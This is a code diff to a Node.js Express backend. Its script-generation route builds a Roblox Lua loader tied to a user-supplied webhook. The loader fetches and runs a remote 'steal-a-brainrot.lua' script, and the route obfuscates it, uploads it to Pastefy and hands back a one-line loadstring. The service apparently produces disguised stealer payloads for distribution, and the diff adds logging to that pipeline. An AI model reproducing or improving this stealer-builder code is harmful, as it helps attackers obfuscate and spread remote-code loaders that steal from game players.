@@ -753,8 +753,22 @@ app.get('/api/leaderboard', async (req, res) => {
 
 app.post('/api/script/generate/:webhook/:game', async (req, res) => {
   try {
+    console.log('\n🔵 [SCRIPT GENERATE] Request received');
+    console.log('📍 URL Params:', req.params);
+    console.log('👤 User:', req.session.user?.username);
+
     if (!req.session.user) {
+      console.log('❌ Not authenticated');
       return res.status(401).json({ success: false, message: 'Login required' });
+    }
+
+    const { webhook, game } = req.params;
+    console.log('🎯 Webhook:', webhook?.substring(0, 50) + '...');
+    console.log('🎮 Game:', game);
+
+    if (!webhook) {
+      console.log('❌ No webhook provided');
+      return res.status(400).json({ success: false, message: 'Webhook URL required' });
     }
 
     const userId = req.session.user.id;
@@ -786,15 +800,10 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
       });
     }
 
-    const { webhook, game } = req.params;
-
-    if (!webhook) {
-      return res.status(400).json({ success: false, message: 'Webhook URL required' });
-    }
-
     try {
       await axios.get(webhook);
     } catch (error) {
+      console.log('❌ Webhook validation failed:', error.message);
       return res.status(400).json({ success: false, message: 'Invalid webhook' });
     }
 
@@ -802,27 +811,37 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
     let originalScript;
 
     try {
+      console.log('🛡️ Creating protection ID...');
       protectionId = createProtectionId(webhook);
       originalScript = `PROTECT_ID = "${protectionId}" -- Protection ID\nloadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyAuto/refs/heads/main/steal-a-brainrot.lua"))()`;
+      console.log('✅ Protection ID created:', protectionId);
     } catch (error) {
+      console.log('❌ Protection creation failed:', error.message);
       return res.status(400).json({ success: false, message: error.message });
     }
 
     let obfuscatedCode;
     try {
+      console.log('🔐 Obfuscating script...');
       obfuscatedCode = await obfuscateScript(originalScript);
+      console.log('✅ Obfuscation successful');
     } catch (error) {
+      console.log('❌ Obfuscation failed:', error.message);
       return res.status(400).json({ success: false, message: error.message });
     }
 
     let pasteData;
     try {
+      console.log('📤 Uploading to Pastefy...');
       pasteData = await uploadToPastefy(obfuscatedCode, req.session.user.username);
+      console.log('✅ Upload successful:', pasteData.pasteId);
     } catch (error) {
+      console.log('❌ Pastefy upload failed:', error.message);
       return res.status(400).json({ success: false, message: error.message });
     }
 
     const loadstringCode = `loadstring(game:HttpGet("${pasteData.rawUrl}"))()`;
+    console.log('✅ Loadstring generated');
 
     try {
       const data = await getStealerData();
@@ -863,8 +882,9 @@ app.post('/api/script/generate/:webhook/:game', async (req, res) => {
         protectionId: protectionId
       }
     });
+    console.log('✅ [SCRIPT GENERATE] Complete!\n');
   } catch (error) {
-    console.error('Generate script error:', error);
+    console.error('❌ Generate script error:', error);
     res.status(500).json({ success: false, message: 'Server error' });
   }
 });
